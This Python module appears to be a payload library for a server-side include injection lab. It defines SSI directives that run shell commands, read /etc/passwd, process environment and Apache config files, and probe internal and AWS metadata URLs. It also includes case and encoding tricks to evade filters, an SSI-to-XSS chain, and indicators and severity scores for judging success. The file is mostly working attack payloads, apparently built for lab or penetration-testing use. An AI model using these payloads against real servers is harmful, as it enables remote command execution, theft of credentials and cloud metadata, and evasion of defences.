"""
ssi_payloads.py — SSI payload database (Project #44, two-step lab)
Each payload gets written to /var/www/html/comment.shtml then rendered.
"""

# ---- SSI directive payloads (raw, no URL-encoding needed — requests handles it) ----

DETECTION_PAYLOADS = {
    "echo_date":     '<!--#echo var="DATE_LOCAL" -->',
    "echo_docroot":  '<!--#echo var="DOCUMENT_ROOT" -->',
    "echo_user":     '<!--#echo var="REMOTE_USER" -->',
    "exec_id":       '<!--#exec cmd="id" -->',
    "exec_whoami":   '<!--#exec cmd="whoami" -->',
    "exec_uname":    '<!--#exec cmd="uname -a" -->',
    "include_secret":'<!--#include virtual="/secret.txt" -->',
}

ENV_VARS = [
    "DATE_LOCAL", "DATE_GMT", "DOCUMENT_ROOT",
    "QUERY_STRING", "REMOTE_ADDR", "SERVER_NAME",
    "SERVER_SOFTWARE", "HTTP_USER_AGENT",
]

# Files reachable via include virtual (web-root relative)
FILE_TARGETS_VIRTUAL = [
    "/secret.txt",
    "/index.html",
]

# Files reachable via exec (since include file= is often blocked)
FILE_TARGETS_VIA_EXEC = [
    "/etc/passwd",
    "/etc/hostname",
    "/etc/hosts",
    "/proc/self/environ",
    "/etc/apache2/apache2.conf",
]

COMMANDS = [
    "id",
    "whoami",
    "uname -a",
    "pwd",
    "cat /etc/hostname",
]

# SSRF candidates (fetch internal URLs via #include virtual)
SSRF_TARGETS = {
    "aws_metadata": "http://169.254.169.254/latest/meta-data/",
    "localhost_admin": "http://127.0.0.1/",
    "own_secret": "/secret.txt",
}

def echo_payload(var_name):
    return f'<!--#echo var="{var_name}" -->'

def exec_payload(cmd):
    return f'<!--#exec cmd="{cmd}" -->'

def include_virtual_payload(path):
    return f'<!--#include virtual="{path}" -->'

def include_file_payload(path):
    return f'<!--#include file="{path}" -->'

def bypass_payloads(var_name="DATE_LOCAL"):
    """Case/whitespace tricks that might evade naive filters."""
    return {
        "lower":         f'<!--#echo var="{var_name}" -->',
        "UPPER":         f'<!--#ECHO VAR="{var_name}" -->',
        "MiXeD":         f'<!--#EcHo VaR="{var_name}" -->',
        "extra_space":   f'<!--#  echo   var="{var_name}"   -->',
        "no_space":      f'<!--#echo var="{var_name}"-->',
        "url_encoded":   f'<!--%23echo var="{var_name}" -->',
        "double_encoded":f'<!--%2523echo var="{var_name}" -->',
    }

def xss_payload(html="<script>alert(1)</script>"):
    """Chain SSI with XSS by echoing HTML from a shell command."""
    # We use printf via exec so shell quoting stays sane
    escaped = html.replace('"', '\\"')
    return f'<!--#exec cmd="echo \\"{escaped}\\"" -->'

INDICATORS = {
    "echo_date":    ["2026", "2025", "2024", "GMT", "UTC"],
    "echo_docroot": ["/var/www", "/usr/local/apache2"],
    "echo_user":    [""],  # often empty — weak
    "exec_id":      ["uid=", "gid=", "groups="],
    "exec_whoami":  ["www-data", "nobody", "daemon", "root"],
    "exec_uname":   ["Linux", "GNU/Linux"],
    "file_passwd":  ["root:x:", "daemon:x:", "nobody:x:"],
    "file_hosts":   ["127.0.0.1", "localhost"],
    "config_leak":  ["SECRET_KEY", "DB_PASSWORD"],
    "flag":         ["FLAG{"],
}

def score(issue_type):
    scores = {
        "ssi_detected":       "INFO",
        "ssi_rce":            "CRITICAL",
        "ssi_file_read":      "HIGH",
        "ssi_env_leak":       "MEDIUM",
        "ssi_ssrf":           "HIGH",
        "ssi_xss":            "MEDIUM",
        "ssi_filter_bypass":  "LOW",
    }
    return scores.get(issue_type, "MEDIUM")
